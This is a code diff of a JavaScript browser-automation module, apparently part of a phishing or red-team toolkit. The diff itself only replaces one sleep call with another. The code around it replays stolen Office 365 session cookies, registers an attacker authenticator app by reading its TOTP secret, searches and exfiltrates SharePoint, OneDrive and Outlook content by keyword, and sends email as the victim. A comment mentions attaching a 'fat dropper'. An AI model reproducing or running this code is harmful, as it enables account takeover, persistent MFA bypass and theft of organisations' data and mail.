@@ -22,7 +22,7 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
     await page.setCookie(...cookies);
     await page.goto(params.fixSession);
     //await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
 
     // Get "+ Add Sign-in method" and click on it
     const assSignIn = await page.waitForSelector('i[data-icon-name="Add"]');
@@ -30,34 +30,34 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
         await assSignIn.click()
     }
 
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     //check for modal dialog open and get DropDown Menu, clicking on it
     const modalDiag = await page.waitForSelector('div.ms-Dropdown-container')
     if(modalDiag !== null){
         await modalDiag.click()
     }
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     //Select the first dropdown option, Authenticator App
     await page.click('div.ms-Callout-main > div > div > button').catch(console.error)
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     // click on Add
     await page.click(nextButtonSelector).catch(console.error)
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     // Click on "I want to use a different authenticator app"
     await page.click('div.ms-Dialog-content > div > div:nth-child(1) > div > div > button').catch(console.error)
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     // click on Next
     await page.click(nextButtonSelector).catch(console.error)
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     // click on "Can't Scan Image"
     await page.click('div.ms-Dialog-content > div > div > div > div > div:nth-child(4) > button').catch(console.error)
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     const accountName = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(6) > span").innerText');
     const secretKey = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(7) > span").innerText');
@@ -67,7 +67,7 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 
     // click on Next
     await page.click(nextButtonSelector).catch(console.error)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // get the OTP from the secretKey using totp-generator
     const totp = await necrohelp.Totp(secretKey)
@@ -77,11 +77,11 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
     const input = 'div.ms-Dialog-content > div > div > div > div:nth-child(2) > div:nth-child(3) > div > div > input';
     await page.type(input, totp, {delay: 300}).catch(console.error)
 
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // click on Next
     await page.click(nextButtonSelector).catch(console.error)
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
 
     await db.UpdateTaskStatus(taskId, "completed")
 
@@ -102,7 +102,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
 
     await page.goto(params.fixSession);
     //await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // check if we are logged in and the cookies set are all fine
     const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
@@ -114,22 +114,22 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     // waffle click
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
     console.log(`[${taskId}] clicking on o365 Apps waffle`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // click on sharepoint
     await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
     console.log(`[${taskId}] loading microsoft Sharepoint`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
     await necrohelp.ScreenshotCurrentPage(page, taskId)
 
     // click on teams
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
     await page.click('#O365_AppTile_SkypeTeams > .o365cs-base > span').catch(console.error)
     console.log(`[${taskId}] loading microsoft Teams`)
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
     await page.click('.use-app-lnk').catch(console.error) // click on Use we WebApp
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
     await necrohelp.ScreenshotCurrentPage(page, taskId)
 
     await db.UpdateTaskStatus(taskId, "completed")
@@ -139,7 +139,7 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
     await page.setCookie(...cookies);
 
     await page.goto(params.fixSession);
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // check if we are logged in and the cookies set are all fine
     const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
@@ -149,12 +149,12 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
     // waffle click
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
     console.log(`[${taskId}] clicking on o365 Apps waffle`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // click on sharepoint
     await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
     console.log(`[${taskId}] loading microsoft Sharepoint`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
    // loop for keywords and open N tabs
     let urlsMatchingKeys = [];
@@ -163,7 +163,7 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
       // TODO make this configurable ofc!
       let url = `https://penitenziagite.sharepoint.com/_layouts/15/sharepoint.aspx?q=${keyword}&v=search`
       await page.goto(url)
-      await page.waitForTimeout(4000)
+      await necrohelp.Sleep(4000)
 
         // get all links matching the search
         // TODO handle pagination if present
@@ -181,11 +181,11 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
     console.log(`[${taskId}]  Found a total of ${urlsMatchingKeys.length} items matching provided keywords. Now fetching...`)
     for(let url of urlsMatchingKeys){
         await page.goto(url)
-        await page.waitForTimeout(2000)
+        await necrohelp.Sleep(2000)
 
         if(url.includes('/Doc.aspx?')){
             // Office document (word, excel..). we instrument the Save As to download the document as file
-            await page.waitForTimeout(2000)
+            await necrohelp.Sleep(2000)
 
             console.log(`[${taskId}] exporting office file...`)
 
@@ -203,7 +203,7 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
             console.log(`[${taskId}]    inner: ${inner}`)
 
             // TODO continue the nested selection and click on File -> Save As..
-            await page.waitForTimeout(2000)
+            await necrohelp.Sleep(2000)
 
            // await main.click('#TabListContainer > div > button').catch(console.error)
 
@@ -222,7 +222,7 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
 
     await page.goto(params.fixSession);
     //await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // check if we are logged in and the cookies set are all fine
     const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
@@ -232,12 +232,12 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
     // waffle click
     await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
     console.log(`[${taskId}] clicking on o365 Apps waffle`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // click on onedrive
     await page.click('#O365_AppTile_Documents').catch(console.error)
     console.log(`[${taskId}] loading microsoft OneDrive`)
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
     await necrohelp.ScreenshotCurrentPage(page, taskId)
 
     // allow downloads
@@ -251,7 +251,7 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
     await page.click('button[name="Download"]').catch(console.error)
 
     // allow enough time for the async download to complete
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
 
     // check how many Shared Libraries we have, and click on each of them downloading files
     let sharedLibs = await page.$$('nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li').catch(console.error)
@@ -262,7 +262,7 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
     while(counter < libsCount){
         let selector = `nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li:nth-child(${counter+1}) > div > a`
         await page.click(selector).catch(console.error)
-        await page.waitForTimeout(3000)
+        await necrohelp.Sleep(3000)
         await necrohelp.ScreenshotCurrentPage(page, taskId)
 
         // get library title
@@ -278,7 +278,7 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
             console.log(`[${taskId}] downloading library "${title}" ...`)
             // click on select all in the MyFiles view
             await page.click('button[name="Download"]').catch(console.error)
-            await page.waitForTimeout(3000)
+            await necrohelp.Sleep(3000)
         }else{
             console.log(`[${taskId}] library "${title}" seems empty, skipping it...`)
         }
@@ -296,7 +296,7 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
     await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)
 
     // TODO just for demo purposes wait longer
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // check if we are logged in and the cookies set are all fine
     const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
@@ -311,7 +311,7 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
     let emailImp = params.writeEmail;
 
     await page.click('#app > div > div:nth-child(3) > div > div > div > div > div:nth-child(2) > button').catch(console.error)
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     let toSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div > div > div > div> div> div > div > div > div > div > input'
     let subjectSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div:nth-child(2) > div >div > div > div > input'
@@ -321,22 +321,22 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
     console.log(`[${taskId}] invoking new email:\n  to[${emailImp.to}]\n  subj[${emailImp.subject}]`)
 
     await page.type(toSelector, emailImp.to)
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     await page.click(subjectSelector).catch(console.error)
     await page.type(subjectSelector, emailImp.subject, {delay: 50})
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     await page.click(contentSelector).catch(console.error)
     await page.type(contentSelector, emailImp.data, {delay: 50})
-    await page.waitForTimeout(3000)
+    await necrohelp.Sleep(3000)
 
     // NOTE clicking on the UI in this case is not needed
     //
     // await page.click('i[data-icon-name="Attach"]').catch(console.error)
-    // await page.waitForTimeout(1000)
+    // await necrohelp.Sleep(1000)
     // await page.click('.ms-ContextualMenu-Callout > div > div > div > ul > li > button').catch(console.error)
-    // await page.waitForTimeout(1000)
+    // await necrohelp.Sleep(1000)
 
     // TODO handle the attachment position in the HTML content. by default the attachment is added at the start of the email
     // TODO maybe we should just click at the end of the email content before adding the attachment?
@@ -349,14 +349,14 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
     //     await fileInput.evaluate(upload => upload.dispatchEvent(new Event('change', { bubbles: true })));
     //
     //     // give enough time for file upload if N megabytes fat dropper
-    //     await page.waitForTimeout(5000)
+    //     await necrohelp.Sleep(5000)
     // }
 
     // click the send button
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
 
     await page.click(sendSelector).catch(console.error)
-    await page.waitForTimeout(5000)
+    await necrohelp.Sleep(5000)
 
     console.log(`[${taskId}] email invoked successfully`)
 
@@ -373,7 +373,7 @@ exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
     // increase zoom for debugging purposes when running in gui mode
     await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)
 
-    await page.waitForTimeout(2000)
+    await necrohelp.Sleep(2000)
 
     // check if we are logged in and the cookies set are all fine
     const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
@@ -386,7 +386,7 @@ exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
         return
     }
 
-    await page.waitForTimeout(1000)
+    await necrohelp.Sleep(1000)
 
     let keywords = params.keywords;
 
@@ -398,9 +398,9 @@ exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
         // TODO sometimes this click throws an error...understand why (not blocking though)
         //await page.click('#searchBoxId-Mail input[aria-label="Search"]').catch(console.error)
         await page.type('#searchBoxId-Mail input[aria-label="Search"]', keyword).catch(console.error)
-        await page.waitForTimeout(1000)
+        await necrohelp.Sleep(1000)
         await page.keyboard.press('Enter');
-        await page.waitForTimeout(3000)
+        await necrohelp.Sleep(3000)
 
         let selector = "div.threeColumnCirclePersonaDivWidth + div";
 
@@ -413,7 +413,7 @@ exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
 
                 // wait at least 2 seconds to give enough time to fat emails to load. Office is not blazing fast
                 await page.click(selector).catch(console.error)
-                await page.waitForTimeout(1000)
+                await necrohelp.Sleep(1000)
 
                 let subject = await page.evaluate("document.querySelector(\"div[aria-label='Content pane'] > div span\").textContent").catch(console.error);
                 let emailParts = await page.$$('div.wide-content-host div.allowTextSelection').catch(console.error);
@@ -447,7 +447,7 @@ exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
         // clean the input search field
         const cleanInput = "document.querySelector(\"#searchBoxId-Mail input[aria-label='Search']\").value = \"\"";
         await page.evaluate(cleanInput);
-        await page.waitForTimeout(2000)
+        await necrohelp.Sleep(2000)
     }
 
     await db.UpdateTaskStatus(taskId, "completed")
